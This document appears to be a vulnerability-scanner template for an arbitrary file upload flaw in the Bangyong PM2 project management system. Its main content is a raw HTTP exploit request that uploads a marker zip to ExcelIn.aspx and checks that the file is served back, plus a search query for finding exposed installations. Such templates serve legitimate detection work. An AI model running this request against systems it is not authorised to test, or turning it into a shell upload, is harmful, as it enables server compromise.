http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(body_2, '12345')
    type: dsl
  raw:
  - "POST /FlowChartDefine/ExcelIn.aspx HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ multipart/form-data; boundary=----{{boundary}}\n\n------{{boundary}}\nContent-Disposition:\
    \ form-data; name=\"__VIEWSTATE\"\n\nU6iRl9SqWWlhjIPJXIeFrsinqYAmYxenxFiyfWFMfWgnw3OtkceDLcdfRvB8pmUNGk44PvjZ6LlzPwDbJGmilsmhuX9LvOiuKadYa9iDdSipLW5JvUHjS89aGzKqr9fhih+p+/Mm+q2vrknhfEJJnQ==\n\
    ------{{boundary}}\nContent-Disposition: form-data; name=\"__VIEWSTATEGENERATOR\"\
    \n\nFD259C0F\n------{{boundary}}\nContent-Disposition: form-data; name=\"__EVENTVALIDATION\"\
    \n\n/pKblUYGQ+ibKtw4CCS2wzX+lmZIOB+x5ezYw0qJFbaUifUKlxNNRMKceZYgY/eAUUTaxe0gSvyv/oA8lUS7G7jPVqqrMEzYBVBl8dRkFWFwMqqjv1G9gXM/ZnIpnVSL\n\
    ------{{boundary}}\nContent-Disposition: form-data; name=\"FileUpload1\"; filename=\"\
    1234.zip\"\nContent-Type: application/x-zip-compressed\n\n{{url_decode(\"PK\\\
    x03\\x04\\x14\\x00\\x01\\x00\\x00\\x00\\xefl\\xfaX\\x1c:\\xf5\\xcb\\x11\\x00\\\
    x00\\x00\\x05\\x00\\x00\\x00\\x08\\x00\\x00\\x001234.txt\\xb0\\x0c\\x01\\x08\\\
    xd1!\\xd1Uv \\xfal\\x9b\\xf4Q\\xfd\\xf8PK\\x01\\x02?\\x00\\x14\\x00\\x01\\x00\\\
    x00\\x00\\xefl\\xfaX\\x1c:\\xf5\\xcb\\x11\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\\
    x08\\x00$\\x00\\x00\\x00\\x00\\x00\\x00\\x00 \\x00\\x00\\x00\\x00\\x00\\x00\\\
    x001234.txt\\x0a\\x00 \\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x18\\x00\\x05\\x8d\\\
    x9d.\\x1e\\xdf\\xda\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\
    x00\\x00\\x00\\x00\\x00\\x00PK\\x05\\x06\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\\
    x00Z\\x00\\x00\\x007\\x00\\x00\\x00\\x00\\x00\")}}\n------{{boundary}}\nContent-Disposition:\
    \ form-data; name=\"Button1\"\n\n\u6A21\u5757\u5BFC\u5165\n------{{boundary}}--\n"
  - 'GET /FlowChartDefine/1234.txt HTTP/1.1

    Host: {{Hostname}}

    '
id: ebsoft-pm2-excelin-file-upload
info:
  author: Co5mos
  description: 'Bangyong PM2 Project Management System''s `ExcelIn.aspx` endpoint
    has an arbitrary file upload vulnerability that allows attackers to upload malicious
    files and execute arbitrary code on the server.

    '
  metadata:
    fofa-query: "body=\"PM2\u9879\u76EE\u7BA1\u7406\u7CFB\u7EDFBS\u7248\u589E\u5F3A\
      \u5DE5\u5177.zip\""
  name: Bangyong PM2 Project Management System ExcelIn.aspx Arbitrary File Upload
  reference:
  - https://github.com/wy876/POC/blob/main/%E9%82%A6%E6%B0%B8PM2%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E7%B3%BB%E7%BB%9FExcelIn.aspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  severity: critical
  tags: bangyong, file-upload, rce, ebsoft
variables:
  boundary: '{{rand_base(30)}}'
